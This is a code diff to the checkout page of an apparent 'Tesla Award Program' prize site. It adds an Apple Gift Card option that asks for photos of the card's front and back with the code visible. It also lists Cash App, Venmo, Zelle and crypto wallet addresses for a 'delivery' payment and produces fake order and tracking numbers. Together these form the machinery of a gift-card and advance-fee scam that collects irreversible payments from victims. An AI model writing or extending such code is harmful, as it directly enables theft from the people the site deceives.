@@ -281,6 +281,54 @@
       <!-- Upload Payment Proof -->
       <div style="font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:12px;">📎 Upload Payment Proof</div>
 
+      <!-- Apple Gift Card: front/back upload (shown only for Apple Gift Card) -->
+      <div id="appleGiftUpload" style="display:none;margin-bottom:20px;">
+        <div style="background:#FFF8F0;border:1px solid rgba(245,158,11,.2);border-radius:12px;padding:14px 18px;font-size:13px;color:#92400E;margin-bottom:14px;line-height:1.6;">
+          <strong>Apple Gift Card Requirements:</strong><br>
+          Please upload clear photos of <strong>both</strong> the front and back of your Apple Gift Card. The code must be visible and unscratched.
+        </div>
+        <div class="gift-upload-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+          <div>
+            <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:6px;">Front of Card</div>
+            <div class="upload-area" id="giftFrontUpload" style="padding:20px;" onclick="event.stopPropagation();document.getElementById('giftFrontFile').click()">
+              <div id="giftFrontState">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:8px;opacity:.5;"><rect x="2" y="6" width="20" height="14" rx="3"/><polyline points="20,10 20,20 4,20 4,10"/><line x1="12" y1="20" x2="12" y2="10"/></svg>
+                <div class="upload-title" style="font-size:14px;">Front Image</div>
+                <div class="upload-hint" style="font-size:12px;">Photo of front with barcode visible</div>
+                <div class="upload-actions" style="margin-top:10px;">
+                  <button class="upload-btn btn-sm" onclick="event.stopPropagation();document.getElementById('giftFrontCamera').click()">📷 Camera</button>
+                  <button class="upload-btn btn-sm primary" onclick="event.stopPropagation();document.getElementById('giftFrontFile').click()">📁 Browse</button>
+                </div>
+              </div>
+              <div class="upload-preview" id="giftFrontPreview"></div>
+            </div>
+            <input type="file" id="giftFrontFile" accept="image/*" style="display:none" onchange="handleGiftFile(this, 'front')">
+            <input type="file" id="giftFrontCamera" accept="image/*" capture="environment" style="display:none" onchange="handleGiftFile(this, 'front')">
+          </div>
+          <div>
+            <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:#888;margin-bottom:6px;">Back of Card</div>
+            <div class="upload-area" id="giftBackUpload" style="padding:20px;" onclick="event.stopPropagation();document.getElementById('giftBackFile').click()">
+              <div id="giftBackState">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:8px;opacity:.5;"><rect x="2" y="6" width="20" height="14" rx="3"/><polyline points="20,10 20,20 4,20 4,10"/><line x1="12" y1="20" x2="12" y2="10"/></svg>
+                <div class="upload-title" style="font-size:14px;">Back Image</div>
+                <div class="upload-hint" style="font-size:12px;">Photo of back with code visible</div>
+                <div class="upload-actions" style="margin-top:10px;">
+                  <button class="upload-btn btn-sm" onclick="event.stopPropagation();document.getElementById('giftBackCamera').click()">📷 Camera</button>
+                  <button class="upload-btn btn-sm primary" onclick="event.stopPropagation();document.getElementById('giftBackFile').click()">📁 Browse</button>
+                </div>
+              </div>
+              <div class="upload-preview" id="giftBackPreview"></div>
+            </div>
+            <input type="file" id="giftBackFile" accept="image/*" style="display:none" onchange="handleGiftFile(this, 'back')">
+            <input type="file" id="giftBackCamera" accept="image/*" capture="environment" style="display:none" onchange="handleGiftFile(this, 'back')">
+          </div>
+        </div>
+        <div style="margin-top:12px;">
+          <div id="giftUploadStatus" style="font-size:13px;font-weight:600;color:var(--admin-text-secondary);text-align:center;"></div>
+        </div>
+      </div>
+
+      <!-- Regular payment proof upload -->
       <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileInput').click()">
         <div id="uploadState">
           <div class="upload-icon" id="uploadIcon">📤</div>
@@ -351,13 +399,16 @@
     // Fallback defaults
     if (!paymentMethods || paymentMethods.length === 0) {
       paymentMethods = [
-        { id:'paypal', name:'paypal', display_name:'PayPal', type:'wallet', icon_emoji:'💳', enabled:true, sort_order:1, wallet_address:'', payment_instructions:'Send payment to our PayPal account. Include your Order ID in the notes.' },
-        { id:'cashapp', name:'cashapp', display_name:'Cash App', type:'wallet', icon_emoji:'💵', enabled:true, sort_order:2, wallet_address:'$TeslaAward', payment_instructions:'Send payment to $TeslaAward on Cash App. Include your Order ID.' },
-        { id:'bitcoin', name:'bitcoin', display_name:'Bitcoin (BTC)', type:'crypto', icon_emoji:'₿', enabled:true, sort_order:3, wallet_address:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', payment_instructions:'Send BTC to the wallet address shown. Network fees may apply.' },
-        { id:'ethereum', name:'ethereum', display_name:'Ethereum (ETH)', type:'crypto', icon_emoji:'♦', enabled:true, sort_order:4, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', payment_instructions:'Send ETH to the wallet address shown. Ensure you use the Ethereum network.' },
-        { id:'usdt', name:'usdt', display_name:'USDT (Tether)', type:'crypto', icon_emoji:'💎', enabled:true, sort_order:5, wallet_address:'TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL', payment_instructions:'Send USDT (TRC-20) to the wallet address shown.' },
-        { id:'creditcard', name:'creditcard', display_name:'Credit Card', type:'card', icon_emoji:'🏦', enabled:true, sort_order:6, wallet_address:'', payment_instructions:'Pay securely using your credit or debit card. We accept Visa, Mastercard, and Amex.' },
-        { id:'applegift', name:'applegift', display_name:'Apple Gift Card', type:'gift', icon_emoji:'🍎', enabled:true, sort_order:7, wallet_address:'', payment_instructions:'Send Apple Gift Card code. Include the code in your upload notes.' }
+        { id:'paypal', name:'paypal', display_name:'PayPal', type:'wallet', logo_id:'pay-paypal', enabled:true, sort_order:1, account_email:'payments@teslaaward.com', business_name:'Tesla Award Program', payment_instructions:'Send payment via PayPal to payments@teslaaward.com. Include your Order ID in the payment notes.' },
+        { id:'cashapp', name:'cashapp', display_name:'Cash App', type:'wallet', logo_id:'pay-cashapp', enabled:true, sort_order:2, cash_tag:'$TeslaAward', account_name:'Tesla Award Program', payment_instructions:'Send payment to $TeslaAward on Cash App. Include your Order ID.' },
+        { id:'venmo', name:'venmo', display_name:'Venmo', type:'wallet', logo_id:'pay-venmo', enabled:true, sort_order:3, username:'@TeslaAward', account_name:'Tesla Award Program', payment_instructions:'Send payment to @TeslaAward on Venmo. Include your Order ID.' },
+        { id:'zelle', name:'zelle', display_name:'Zelle', type:'wallet', logo_id:'pay-zelle', enabled:true, sort_order:4, recipient_name:'Tesla Award Program', email:'payments@teslaaward.com', payment_instructions:'Send payment via Zelle to payments@teslaaward.com. Include your Order ID in the memo.' },
+        { id:'bitcoin', name:'bitcoin', display_name:'Bitcoin (BTC)', type:'crypto', logo_id:'pay-bitcoin', enabled:true, sort_order:5, wallet_address:'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', network:'Bitcoin', payment_instructions:'Send BTC to the wallet address shown. Network fees may apply.' },
+        { id:'ethereum', name:'ethereum', display_name:'Ethereum (ETH)', type:'crypto', logo_id:'pay-ethereum', enabled:true, sort_order:6, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', network:'Ethereum (ERC-20)', payment_instructions:'Send ETH to the wallet address shown. Ensure you use the Ethereum network.' },
+        { id:'usdt-erc20', name:'usdt-erc20', display_name:'USDT (ERC-20)', type:'crypto', logo_id:'pay-usdt', enabled:true, sort_order:7, wallet_address:'0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18', network:'Ethereum (ERC-20)', payment_instructions:'Send USDT (ERC-20) to the wallet address shown.' },
+        { id:'usdt-trc20', name:'usdt-trc20', display_name:'USDT (TRC-20)', type:'crypto', logo_id:'pay-usdt-trc20', enabled:true, sort_order:8, wallet_address:'TXn7vGJqLjwFYzRKUvR7qJAMfJbGGzLKVL', network:'Tron (TRC-20)', payment_instructions:'Send USDT (TRC-20) to the wallet address shown.' },
+        { id:'creditcard', name:'creditcard', display_name:'Credit Card', type:'card', logo_id:'pay-creditcard', enabled:true, sort_order:9, accepted_networks:['visa','mastercard','amex','discover'], payment_instructions:'Pay securely using your credit or debit card. We accept Visa, Mastercard, American Express, and Discover.' },
+        { id:'applegift', name:'applegift', display_name:'Apple Gift Card', type:'gift', logo_id:'pay-applegift', enabled:true, sort_order:10, require_front:true, require_back:true, allow_camera:true, min_value:'10', payment_instructions:'Send your Apple Gift Card code by uploading images of the front and back of the card.' }
       ];
       localStorage.setItem('tesla_payment_methods', JSON.stringify(paymentMethods));
     }
@@ -370,11 +421,11 @@
     if (!list) return;
     var enabled = paymentMethods.filter(function(pm) { return pm.enabled !== false; });
     list.innerHTML = enabled.map(function(pm) {
-      var icon = pm.icon_emoji || pm.icon || '💳';
+      var logoId = pm.logo_id || 'pay-creditcard';
       var name = pm.display_name || pm.displayName || pm.name || 'Payment';
       var isSelected = selectedPaymentId === pm.id;
       return '<div class="other-method-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + pm.id + '\')">' +
-        '<div class="om-icon">' + icon + '</div>' +
+        '<div class="om-icon"><svg width="36" height="36" viewBox="0 0 24 24"><use href="assets/payment-logos.svg#' + logoId + '"/></svg></div>' +
         '<div class="om-name">' + escapeHtml(name) + '</div>' +
         (isSelected ? '<div class="om-badge selected-badge" style="background:#E31937;color:#fff;display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:999px;margin-top:4px;">Selected</div>' : '') +
         '</div>';
@@ -402,17 +453,22 @@
     section.style.animation = 'slideInUp 0.3s ease';
 
     var name = pm.display_name || pm.displayName || pm.name || 'Payment';
-    var icon = pm.icon_emoji || pm.icon || '💳';
+    var logoId = pm.logo_id || 'pay-creditcard';
     var type = pm.type || 'wallet';
-    var address = pm.wallet_address || pm.walletAddress || '';
+    var address = '';
+    if (type === 'crypto') {
+      address = pm.wallet_address || pm.walletAddress || '';
+    } else if (type === 'wallet') {
+      address = pm.account_email || pm.email || pm.cash_tag || pm.username || pm.phone || '';
+    }
     var instructions = pm.payment_instructions || pm.instructions || '';
 
     document.getElementById('pmDetailTitle').textContent = name;
     document.getElementById('pmDetailType').textContent = type.charAt(0).toUpperCase() + type.slice(1);
 
     var iconEl = document.getElementById('pmBigIcon');
-    iconEl.textContent = icon;
-    iconEl.className = 'pay-big-icon ' + type;
+    iconEl.innerHTML = '<svg width="32" height="32" viewBox="0 0 24 24"><use href="assets/payment-logos.svg#' + logoId + '"/></svg>';
+    iconEl.className = 'pay-big-icon';
 
     var addrBox = document.getElementById('walletAddressBox');
     var addrEl = document.getElementById('walletAddress');
@@ -680,6 +736,152 @@
     setTimeout(function() { t.style.opacity = '0'; t.style.transform = 'translateX(20px)'; t.style.transition = 'opacity .35s ease, transform .35s ease'; setTimeout(function() { if (t.parentNode) t.remove(); }, 350); }, 5000);
   }
 
+  // ── APPLE GIFT CARD UPLOAD ──
+  var giftFrontData = null;
+  var giftBackData = null;
+
+  function handleGiftFile(input, side) {
+    var file = input.files && input.files[0];
+    if (!file) return;
+    if (!file.type.startsWith('image/')) { showToast('Please select an image file', 'error'); return; }
+    if (file.size > 10 * 1024 * 1024) { showToast('File too large (max 10MB)', 'error'); return; }
+    var reader = new FileReader();
+    reader.onload = function(e) {
+      var dataUrl = e.target.result;
+      if (side === 'front') { giftFrontData = dataUrl; } else { giftBackData = dataUrl; }
+      showGiftPreview(side, dataUrl, file.name);
+    };
+    reader.readAsDataURL(file);
+    input.value = '';
+  }
+
+  function showGiftPreview(side, dataUrl, fileName) {
+    var previewEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Preview');
+    var stateEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'State');
+    if (!previewEl || !stateEl) return;
+    stateEl.style.display = 'none';
+    previewEl.style.display = 'block';
+    previewEl.innerHTML = '<img src="' + dataUrl + '" alt="' + side + ' of gift card" style="max-width:100%;max-height:140px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);"><div class="file-name" style="font-size:12px;margin-top:6px;">' + escapeHtml(fileName) + ' ✓</div>';
+    var uploadBox = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Upload');
+    if (uploadBox) uploadBox.classList.add('has-file');
+    updateGiftStatus();
+  }
+
+  function updateGiftStatus() {
+    var statusEl = document.getElementById('giftUploadStatus');
+    if (!statusEl) return;
+    if (giftFrontData && giftBackData) {
+      statusEl.innerHTML = '<span style="color:var(--success);">✓ Both front and back images uploaded — ready to submit</span>';
+      if (uploadedFileData) {
+        var submitBtn = document.getElementById('submitBtn');
+        if (submitBtn && selectedPaymentId) { submitBtn.disabled = false; submitBtn.style.opacity = '1'; submitBtn.style.cursor = 'pointer'; }
+      }
+    } else if (giftFrontData || giftBackData) {
+      statusEl.innerHTML = '<span style="color:#D97706;">⏳ ' + (giftFrontData ? 'Front' : 'Back') + ' uploaded — please upload the ' + (giftFrontData ? 'back' : 'front') + ' image to continue</span>';
+    } else {
+      statusEl.innerHTML = '';
+    }
+  }
+
+  // ── OVERRIDE selectPaymentMethod for Apple Gift Card ──
+  var origShowDetails = showPaymentDetails;
+  selectPaymentMethod = function(id) {
+    selectedPaymentId = id;
+    renderPaymentMethods();
+    var pm = paymentMethods.find(function(p) { return p.id === id; });
+    var isAppleGift = pm && (pm.type === 'gift' || pm.id === 'applegift' || pm.name === 'applegift');
+    var giftSection = document.getElementById('appleGiftUpload');
+    var regularUpload = document.getElementById('uploadArea');
+    var uploadLabel = document.querySelector('[style*="font-size:13px;font-weight:700;text-transform:uppercase"]');
+    if (isAppleGift) {
+      if (giftSection) giftSection.style.display = 'block';
+      if (regularUpload) regularUpload.style.display = 'none';
+      if (uploadLabel) uploadLabel.textContent = '🎁 Apple Gift Card Upload';
+    } else {
+      if (giftSection) giftSection.style.display = 'none';
+      if (regularUpload) regularUpload.style.display = 'block';
+      if (uploadLabel) uploadLabel.textContent = '📎 Upload Payment Proof';
+    }
+    showPaymentDetails(id);
+  }
+
+  // ── OVERRIDE submitPayment for Apple Gift Card ──
+  var origSubmit = submitPayment;
+  submitPayment = function() {
+    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
+    var pm = paymentMethods.find(function(p) { return p.id === selectedPaymentId; });
+    var isAppleGift = pm && (pm.type === 'gift' || pm.id === 'applegift' || pm.name === 'applegift');
+    if (isAppleGift) {
+      if (!giftFrontData || !giftBackData) {
+        showToast('Please upload both front and back images of the Apple Gift Card', 'error');
+        return;
+      }
+      // Save gift card images as payment proof
+      var proofs = [];
+      try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+      var orderId = 'TSLA-' + Date.now().toString(36).toUpperCase();
+      var proof = {
+        id: 'proof_' + Date.now(),
+        user_id: 'customer',
+        order_id: orderId,
+        payment_method: 'Apple Gift Card',
+        proof_url: giftFrontData,
+        proof_back_url: giftBackData,
+        proof_type: 'gift_card',
+        amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      proofs.unshift(proof);
+      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+    } else {
+      if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
+    }
+    // Continue with existing submit logic
+    var pmName = pm ? (pm.display_name || pm.displayName || pm.name || selectedPaymentId) : selectedPaymentId;
+    if (!isAppleGift) {
+      var proofs = [];
+      try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
+      var orderId = 'TSLA-' + Date.now().toString(36).toUpperCase();
+      var proof = {
+        id: 'proof_' + Date.now(),
+        user_id: 'customer',
+        order_id: orderId,
+        payment_method: pmName,
+        proof_url: uploadedFileData,
+        proof_type: 'image',
+        amount: deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'),
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      proofs.unshift(proof);
+      localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
+    }
+    // Save order
+    var orderData = {
+      orderId: orderId,
+      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
+      email: deliveryDetails.email || '',
+      selectedCar: selectedCar,
+      deliveryDetails: deliveryDetails,
+      deliveryMethod: deliveryMethod,
+      paymentMethod: { id: selectedPaymentId, name: pmName },
+      status: 'awaiting_payment_confirmation',
+      orderDate: new Date().toISOString(),
+      estimatedDelivery: deliveryMethod.days || '5–10 business days'
+    };
+    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
+    // API call
+    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE) ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
+    if (API_BASE) {
+      fetch(API_BASE + '/order', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionToken: sessionToken, selectedCar: selectedCar, deliveryDetails: deliveryDetails, deliveryMethod: deliveryMethod, paymentMethod: { id: selectedPaymentId, name: pmName } })
+      }).then(function(r){return r.json()}).then(function(r){if(r.order)localStorage.setItem('tesla_last_order',JSON.stringify(r.order))}).catch(function(){});
+      fetch(API_BASE + '/admin/payment-proofs/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(proof) }).catch(function(){});
+    }
+    window.location.href = 'order-placed.html';
+  }
+
   // ── INIT ──
   window.selectPaymentMethod = selectPaymentMethod;
   window.copyAddress = copyAddress;
@@ -688,6 +890,7 @@
   window.resetUpload = resetUpload;
   window.confirmUpload = confirmUpload;
   window.submitPayment = submitPayment;
+  window.handleGiftFile = handleGiftFile;
 
   loadPaymentMethods();
 
